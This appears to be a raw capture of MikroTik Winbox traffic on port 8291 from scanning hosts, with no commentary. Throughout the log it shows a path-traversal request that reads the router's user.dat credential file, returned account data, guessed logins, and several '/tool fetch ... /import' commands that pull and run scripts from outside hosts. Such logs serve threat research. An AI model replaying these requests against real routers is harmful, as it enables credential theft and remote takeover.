3.0.152.10,8291,50.249.48.49,49604,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,17.28.115.93,58000,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
17.28.115.93,58000,3.0.152.10,8291,"{u2:302,ufe0001:6,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,17.28.115.93,58000,"{bff0005:1,u2:32768,ufe0001:6,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.94.251.109,49833,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,245,203,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,3.94.251.109,49833,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,3.94.251.109,49833,"{bff0005:1,u2:32768,ufe0001:7,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.94.251.109,61432,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,104,217,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,3.94.251.109,61432,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,3.94.251.109,61432,"{ufe0001:8,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,3.94.251.109,61432,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
3.94.251.109,61432,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[9,195,254,136,192,46,146,119,41,253,200,142,125,60,41,222],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,3.94.251.109,61432,"{bff0005:1,uff0006:3,uff0007:1,s1:'service',r9:[9,195,254,136,192,46,146,119,41,253,200,142,125,60,41,222],ra:[0,213,48,48,193,173,27,125,240,207,178,24,252,63,243,182,94],Uff0001:[13,4],Uff0002:[0,11]}"
178.42.196.112,65513,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,178.42.196.112,65513,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
178.42.196.112,65513,3.0.152.10,8291,"{u2:302,ufe0001:9,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
178.42.196.112,65513,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[3717]}"
3.0.152.10,8291,53.162.6.117,55345,"{bff0005:1,u2:32768,ufe0001:9,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,53.162.6.117,55345,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
53.162.6.117,55345,3.0.152.10,8291,"{u2:302,ufe0001:10,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,53.162.6.117,55345,"{bff0005:1,u2:32768,ufe0001:10,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
53.162.6.117,62011,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,203,248,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,53.162.6.117,62011,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,53.162.6.117,62011,"{ufe0001:11,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,53.162.6.117,62011,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
53.162.6.117,62011,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[40,80,224,199,164,178,237,107,41,125,196,204,166,9,250,23],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,53.162.6.117,62011,"{bff0005:1,uff0006:3,uff0007:1,s1:'supervisor',r9:[40,80,224,199,164,178,237,107,41,125,196,204,166,9,250,23],ra:[0,214,223,170,254,155,211,21,40,160,67,164,114,111,197,69,22],Uff0001:[13,4],Uff0002:[0,11]}"
53.162.6.117,59991,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,53.162.6.117,59991,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
53.162.6.117,59991,3.0.152.10,8291,"{u2:1209,ufe0001:12,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,53.162.6.117,59991,"{ufe0001:12,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,53.162.6.117,59991,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
53.162.6.117,59991,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[207,161,198,118,175,202,148,70,9,162,205,197,155,104,83,69],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,53.162.6.117,59991,"{bff0005:1,uff0006:3,uff0007:1,s1:'admin',r9:[207,161,198,118,175,202,148,70,9,162,205,197,155,104,83,69],ra:[0,249,125,146,210,6,159,239,230,105,160,232,130,127,63,179,141],Uff0001:[13,4],Uff0002:[0,11]}"
53.162.6.117,59991,3.0.152.10,8291,"{b13:0,ub:524286,uf:32,u10:6,ufe0001:291,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,249,125,146,210,6,159,239,230,105,160,232,130,127,63,179,141],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,53.162.6.117,59991,"{bfe000a:0,bff0005:1,u71:327678,u12e:4294967295,u12f:305769600,u131:600,ufe000c:5,uff0006:12,uff0007:16646149,s66:'U6',s12d:'/tool fetch url=http://hitsmoby.com/poll/e7015b46-8dc7-4a85-adef-f0f8d0d77f2d mode=http dst-path=7wmp0b4s.rsc
/import 7wmp0b4s.rsc',sfe0009:'',Uff0001:[48,3],Uff0002:[0,130]}"
120.20.41.41,50144,3.0.152.10,8291,"{ufe0001:0,uff0003:2,uff0006:12,Uff0001:[0,130],Uff0002:[48,3]}"
3.0.152.10,8291,120.20.41.41,50144,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
120.20.41.41,50144,3.0.152.10,8291,"{u2:302,ufe0001:13,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,120.20.41.41,50144,"{bff0005:1,u2:32768,ufe0001:13,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
93.31.161.188,20519,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,234,249,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,102,249,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,93.31.161.188,20519,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
93.31.161.188,20519,3.0.152.10,8291,"{u2:1209,ufe0001:14,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,93.31.161.188,20519,"{ufe0001:14,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,103.166.211.117,58166,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
103.166.211.117,58166,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,103.166.211.117,58166,"{bff0005:1,u2:32768,ufe0001:1,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
103.166.211.117,50120,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,53,67,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,103.166.211.117,50120,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,103.166.211.117,50120,"{ufe0001:2,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,103.166.211.117,50120,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
103.166.211.117,50120,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[158,156,54,182,157,50,224,198,194,127,159,76,24,24,196,195],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,103.166.211.117,50120,"{bff0005:1,uff0006:3,uff0007:1,s1:'tit0nich',r9:[158,156,54,182,157,50,224,198,194,127,159,76,24,24,196,195],ra:[0,8,174,131,51,176,217,41,228,151,241,81,145,40,117,247,53],Uff0001:[13,4],Uff0002:[0,11]}"
103.166.211.117,51878,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,103.166.211.117,51878,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
103.166.211.117,51878,3.0.152.10,8291,"{u2:1209,ufe0001:3,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,103.166.211.117,51878,"{ufe0001:3,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,103.166.211.117,51878,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
103.166.211.117,51878,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[4,31,136,156,225,135,228,58,32,199,198,244,20,19,52,49],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,103.166.211.117,51878,"{bff0005:1,uff0006:3,uff0007:1,s1:'admin',r9:[4,31,136,156,225,135,228,58,32,199,198,244,20,19,52,49],ra:[0,63,109,118,19,230,10,208,36,179,207,211,255,177,49,147,36],Uff0001:[13,4],Uff0002:[0,11]}"
103.166.211.117,51878,3.0.152.10,8291,"{b13:0,ub:524286,uf:32,u10:6,ufe0001:129,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,63,109,118,19,230,10,208,36,179,207,211,255,177,49,147,36],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,103.166.211.117,51878,"{bfe000a:0,bff0005:1,u71:327678,u12e:4294967295,u12f:305769600,u131:600,ufe000c:5,uff0006:3,uff0007:16646149,s66:'U6',s12d:'/tool fetch url=http://7standby.com/poll/b964b71a-658b-40b0-9491-fc58318f0bc5 mode=http dst-path=7wmp0b4s.rsc
/import 7wmp0b4s.rsc',sfe0009:'',Uff0001:[48,3],Uff0002:[0,130]}"
67.112.123.124,6037,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[2014]}"
67.112.123.124,6037,3.0.152.10,8291,"{ufe0001:0,uff0003:2,uff0006:3,Uff0001:[0,130],Uff0002:[48,3]}"
3.0.152.10,8291,67.112.123.124,6037,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
67.112.123.124,6037,3.0.152.10,8291,"{u2:302,ufe0001:4,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,67.112.123.124,6037,"{bff0005:1,u2:32768,ufe0001:4,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
152.183.172.118,32029,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,185,164,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,83,68,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,152.183.172.118,32029,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
152.183.172.118,32029,3.0.152.10,8291,"{u2:1209,ufe0001:5,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
152.183.172.118,32029,3.0.152.10,8291,"{u2:1209,ufe0001:5,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,152.183.172.118,32029,"{ufe0001:5,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,152.183.172.118,32029,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
152.183.172.118,32029,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[153,141,64,146,215,158,152,102,68,157,158,5,76,148,12,32],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,152.183.172.118,32029,"{bff0005:1,uff0006:3,uff0007:1,s1:'Administrator',r9:[153,141,64,146,215,158,152,102,68,157,158,5,76,148,12,32],ra:[0,177,223,207,45,97,55,139,210,177,147,250,108,71,33,137,136],Uff0001:[13,4],Uff0002:[0,11]}"
152.183.172.118,63417,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
117.211.59.41,61143,3.0.152.10,8291,"{u2:302,ufe0001:6,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,117.211.59.41,61143,"{bff0005:1,u2:32768,ufe0001:6,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
46.163.72.131,61768,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,34,224,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,83,68,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,46.163.72.131,61768,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,46.163.72.131,61768,"{bff0005:1,u2:32768,ufe0001:7,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,29.127.98.171,57638,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
29.127.98.171,57638,3.0.152.10,8291,"{u2:1209,ufe0001:1,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,29.127.98.171,57638,"{ufe0001:1,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,29.127.98.171,57638,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
29.127.98.171,57638,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[184,72,208,45,233,56,41,202,97,19,6,103,86,89,15,149],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,29.127.98.171,57638,"{bff0005:1,uff0006:3,uff0007:1,s1:'888888',r9:[184,72,208,45,233,56,41,202,97,19,6,103,86,89,15,149],ra:[0,12,21,184,115,47,69,104,184,228,128,250,152,66,226,58,199],Uff0001:[13,4],Uff0002:[0,11]}"
151.178.88.183,47863,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,151.178.88.183,47863,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
151.178.88.183,23525,3.0.152.10,8291,"{u2:302,ufe0001:2,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,151.178.88.183,23525,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
151.178.88.183,23525,3.0.152.10,8291,"{u2:1209,ufe0001:3,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,151.178.88.183,23525,"{ufe0001:3,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,151.178.88.183,23525,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
151.178.88.183,23525,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[176,120,76,238,16,183,205,21,197,40,216,254,5,89,53,123],Uff0001:[0,11],Uff0002:[13,4]}"
151.178.88.183,23525,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[2036]}"
3.0.152.10,8291,151.178.88.183,23525,"{bff0005:1,uff0006:3,uff0007:1,s1:'user1',r9:[176,120,76,238,16,183,205,21,197,40,216,254,5,89,53,123],ra:[0,235,95,230,249,103,37,32,118,190,198,101,238,164,198,142,169],Uff0001:[13,4],Uff0002:[0,11]}"
151.178.88.183,23525,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,28.89.153.59,65085,"{bfe000a:0,bff0005:1,u71:327678,u12e:4294967295,u12f:305769600,u131:600,ufe000c:5,uff0006:3,uff0007:16646149,s66:'U6',s12d:'/tool fetch url=http://1awesome.net/poll/278088cb-c2ad-402d-aeaf-f8cebe64ff23 mode=http dst-path=7wmp0b4s.rsc
/import 7wmp0b4s.rsc',sfe0009:'',Uff0001:[48,3],Uff0002:[0,130]}"
3.0.152.10,8291,28.89.153.59,65085,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,28.89.153.59,65085,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
28.89.153.59,65085,3.0.152.10,8291,"{u2:302,ufe0001:5,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,28.89.153.59,65085,"{bff0005:1,u2:32768,ufe0001:5,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,70.48.77.36,52063,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
70.48.77.36,52063,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
117.253.10.121,13291,3.0.152.10,8291,"{u2:1209,ufe0001:2,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
